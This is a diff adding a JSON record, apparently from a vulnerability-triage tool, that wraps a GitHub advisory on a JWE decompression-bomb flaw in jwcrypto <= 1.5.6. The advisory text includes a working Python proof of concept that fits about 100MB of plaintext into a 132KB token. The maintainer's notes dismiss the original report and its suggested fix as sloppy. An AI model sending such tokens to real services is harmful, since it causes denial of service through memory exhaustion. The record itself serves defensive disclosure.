@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/202265401?v=4\", \"events_url\": \"https://api.github.com/users/hkmj19/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/hkmj19/followers\", \"following_url\": \"https://api.github.com/users/hkmj19/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/hkmj19/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/hkmj19\", \"id\": 202265401, \"login\": \"hkmj19\", \"node_id\": \"U_kgDODA5TOQ\", \"organizations_url\": \"https://api.github.com/users/hkmj19/orgs\", \"received_events_url\": \"https://api.github.com/users/hkmj19/received_events\", \"repos_url\": \"https://api.github.com/users/hkmj19/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/hkmj19/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/hkmj19/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/hkmj19\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-39373\", \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-409\", \"name\": \"Improper Handling of Highly Compressed Data (Data Amplification)\"}], \"description\": \"### Summary\\nThe fix for GHSA-j857-7rvv-vj97 in v1.5.6 is weak in that it does not allow to fully control the amount of plaintext the receiver is willing to deal with and provides just a weak upper bound. The patch limits input token size to 250KB but does not validate the decompressed output size. An unauthenticated attacker can craft a JWE token under the 250KB input limit that decompresses to very large data that may exceed small devices memory availability, causing Denial of Service via memory exhaustion.\\n\\nAlthough this is technically not unbounded I do recognize that it may be too much for devices and is something that could be surprising to developers, and we can do better than that.\\n\\nNOTE: the original report was sloppy (probably AI slop) and claimed arbitrary memory consumption, but simple testing showed that while 100MB could be decompressed a 1GB output was denied because the token exceeded the 250K compressed serialization.\\n\\nNOTE WELL: The proposed solution was also sloppy, proposing to first decompress the data completely in memory (therefore causing the memory exhaustion) and then checking how much memory was already used to deny the operation. I _intentionally_ left the \\\"details\\\" section untouched to show how bad AI slop is and how _uncritical_ the submitter was, even as it was obvious the \\\"suggested fix\\\" is actually no solution at all, as it was using the very call that he claimed was causing \\\"arbitrary\\\" memory exhaustion and wrapping it around an \\\"if\\\" ... the actual solution is in the resolving commit in version 1.5.7\\n\\n### Details\\nThe vulnerable code in `jwcrypto/jwe.py`:\\n```python\\nif len(data) > default_max_compressed_size:\\n    raise InvalidJWEData('Compressed data exceeds maximum allowed size')\\nself.plaintext = zlib.decompress(data, -zlib.MAX_WBITS)\\n```\\n\\nThe check validates `data` which is the **compressed** bytes, not the decompressed output. A 132KB token (under the 250KB limit) can decompress to approximately 100MB with no error raised.\\n\\n### PoC\\nTested on jwcrypto 1.5.6 (patched version):\\n```python\\nimport zlib\\nfrom jwcrypto import jwe\\nfrom jwcrypto.jwk import JWK\\nimport time\\n\\nkey = JWK.generate(kty='oct', size=128)\\nbomb_data = b\\\"A\\\" * 1024 * 1024 * 100  # 100MB uncompressed\\n\\ntoken = jwe.JWE(\\n    plaintext=bomb_data,\\n    protected={\\\"alg\\\": \\\"A128KW\\\", \\\"enc\\\": \\\"A128GCM\\\", \\\"zip\\\": \\\"DEF\\\"}\\n)\\ntoken.add_recipient(key)\\nserialized = token.serialize(compact=True)\\nprint(f\\\"Token size: {len(serialized)/1024:.1f} KB\\\")  # 132.8 KB — under 250KB limit\\n\\ntok2 = jwe.JWE()\\ntok2.deserialize(serialized, key)\\nprint(f\\\"Decompressed: {len(tok2.plaintext)/1024/1024:.0f} MB\\\")  # 100 MB\\n```\\n\\nOutput:\\n```\\nToken size: 132.8 KB\\nDecompressed: 100 MB\\n```\\n\\n### Impact\\nAn unauthenticated attacker can exhaust server memory by sending crafted JWE tokens with ZIP compression. The existing patch (v1.5.6) does not prevent this attack. An unauthenticated attacker can cause memory exhaustion on memory-constrained systems. A token under the 250KB input limit can decompress to approximately 100MB.\", \"epss\": {\"percentage\": 0.00294, \"percentile\": 0.20904}, \"ghsa_id\": \"GHSA-fjrm-76x2-c4q4\", \"github_reviewed_at\": \"2026-04-08T00:16:14Z\", \"html_url\": \"https://github.com/advisories/GHSA-fjrm-76x2-c4q4\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-fjrm-76x2-c4q4\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-39373\"}], \"nvd_published_at\": \"2026-04-07T20:16:32Z\", \"published_at\": \"2026-04-08T00:16:14Z\", \"references\": [\"https://github.com/latchset/jwcrypto/security/advisories/GHSA-fjrm-76x2-c4q4\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-39373\", \"https://github.com/latchset/jwcrypto/commit/25db861d8b29434838669a94a843af03d29ea6ed\", \"https://github.com/latchset/jwcrypto/releases/tag/v1.5.7\", \"https://github.com/pypa/advisory-database/tree/main/vulns/jwcrypto/PYSEC-2026-70.yaml\", \"https://github.com/advisories/GHSA-fjrm-76x2-c4q4\"], \"repository_advisory_url\": \"https://api.github.com/repos/latchset/jwcrypto/security-advisories/GHSA-fjrm-76x2-c4q4\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/latchset/jwcrypto\", \"summary\": \"JWCrypto: JWE ZIP decompression bomb\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-06T00:25:45Z\", \"url\": \"https://api.github.com/advisories/GHSA-fjrm-76x2-c4q4\", \"vulnerabilities\": [{\"first_patched_version\": \"1.5.7\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"jwcrypto\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.5.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-fjrm-76x2-c4q4",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "jwcrypto: <= 1.5.6"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-39373"
+    ],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "jwcrypto"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.564054Z",
+  "provenance": {
+    "content_sha256": "90891d0a0cd7a06e9a5c47eb768c07ec3d1e31421662246e3691d088a2a8fae4",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-08T00:16:14Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-fjrm-76x2-c4q4",
+  "status": "active",
+  "title": "JWCrypto: JWE ZIP decompression bomb",
+  "updated_at": "2026-06-06T00:25:45Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-fjrm-76x2-c4q4"
+}
